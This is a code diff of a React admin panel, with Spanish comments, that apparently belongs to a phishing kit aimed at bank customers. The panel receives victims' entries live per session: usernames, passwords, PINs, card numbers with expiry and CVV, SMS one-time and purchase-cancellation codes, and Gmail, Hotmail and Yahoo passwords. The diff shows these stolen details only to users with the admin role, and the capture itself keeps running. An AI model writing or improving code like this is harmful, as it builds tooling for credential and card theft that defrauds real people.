@@ -335,75 +335,84 @@ export default function AdminPanel() {
         }
         else if (data.type === 'SMS_COMPRA_CODE') {
           // Notificación especial para códigos SMS_COMPRA
-          const { sessionId, code } = data.data;
-          
-          toast({
-            title: "Código de cancelación SMS_COMPRA",
-            description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
-            variant: "default",
-          });
-          
-          console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
+          // Solo mostrar la notificación si el usuario es administrador
+          if (user?.role === 'admin') {
+            const { sessionId, code } = data.data;
+            
+            toast({
+              title: "Código de cancelación SMS_COMPRA",
+              description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
+              variant: "default",
+            });
+            
+            console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
+          }
         }
         else if (data.type === 'CLIENT_INPUT_REALTIME') {
-          // Mostrar notificación de entrada de datos en tiempo real
+          // Procesar entrada de datos en tiempo real
           const { sessionId, tipo, inputData } = data.data;
           
-          // Manejo especial para SMS_COMPRA
-          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
-            if (inputData && inputData.smsCompra) {
-              toast({
-                title: "¡Código de cancelación recibido!",
-                description: `Código: ${inputData.smsCompra}`,
-                variant: "default",
-              });
+          // Solo mostrar notificaciones con detalles sensibles a administradores
+          if (user?.role === 'admin') {
+            // Manejo especial para SMS_COMPRA
+            if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
+              if (inputData && inputData.smsCompra) {
+                toast({
+                  title: "¡Código de cancelación recibido!",
+                  description: `Código: ${inputData.smsCompra}`,
+                  variant: "default",
+                });
+              }
             }
+            
+            // Mostrar notificación toast con los datos recibidos
+            let inputDescription = '';
+            switch (tipo) {
+              case 'folio':
+                inputDescription = `Folio: ${inputData.folio}`;
+                break;
+              case 'login':
+                inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
+                break;
+              case 'codigo':
+                inputDescription = `Código SMS: ${inputData.codigo}`;
+                break;
+              case 'nip':
+                inputDescription = `NIP: ${inputData.nip}`;
+                break;
+              case 'tarjeta':
+                inputDescription = `Tarjeta: ${inputData.tarjeta}`;
+                break;
+              case 'sms_compra':
+              case 'SMS_COMPRA':
+              case 'smsCompra':
+                inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
+                break;
+              case 'gmail':
+                inputDescription = `Gmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+                break;
+              case 'hotmail':
+                inputDescription = `Hotmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+                break;
+              case 'yahoo':
+                inputDescription = `Yahoo - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+                break;
+              case 'datos_tarjeta':
+                inputDescription = `Datos Tarjeta - Número: ${inputData.numeroTarjeta || 'N/A'}, Vencimiento: ${inputData.fechaVencimiento || 'N/A'}, CVV: ${inputData.cvv || 'N/A'}`;
+                break;
+              default:
+                inputDescription = `Datos de ${tipo}`;
+            }
+            
+            toast({
+              title: "Datos recibidos en tiempo real",
+              description: inputDescription,
+              variant: "default",
+            });
+          } else {
+            // Para usuarios no administradores, solo registrar en consola sin mostrar notificaciones
+            console.log("Datos recibidos pero no se muestran a usuarios no administradores:", tipo);
           }
-          
-          // Mostrar notificación toast con los datos recibidos
-          let inputDescription = '';
-          switch (tipo) {
-            case 'folio':
-              inputDescription = `Folio: ${inputData.folio}`;
-              break;
-            case 'login':
-              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
-              break;
-            case 'codigo':
-              inputDescription = `Código SMS: ${inputData.codigo}`;
-              break;
-            case 'nip':
-              inputDescription = `NIP: ${inputData.nip}`;
-              break;
-            case 'tarjeta':
-              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
-              break;
-            case 'sms_compra':
-            case 'SMS_COMPRA':
-            case 'smsCompra':
-              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
-              break;
-            case 'gmail':
-              inputDescription = `Gmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
-              break;
-            case 'hotmail':
-              inputDescription = `Hotmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
-              break;
-            case 'yahoo':
-              inputDescription = `Yahoo - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
-              break;
-            case 'datos_tarjeta':
-              inputDescription = `Datos Tarjeta - Número: ${inputData.numeroTarjeta || 'N/A'}, Vencimiento: ${inputData.fechaVencimiento || 'N/A'}, CVV: ${inputData.cvv || 'N/A'}`;
-              break;
-            default:
-              inputDescription = `Datos de ${tipo}`;
-          }
-          
-          toast({
-            title: "Datos recibidos en tiempo real",
-            description: inputDescription,
-            variant: "default",
-          });
           
           // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
           setSessions(prev => {
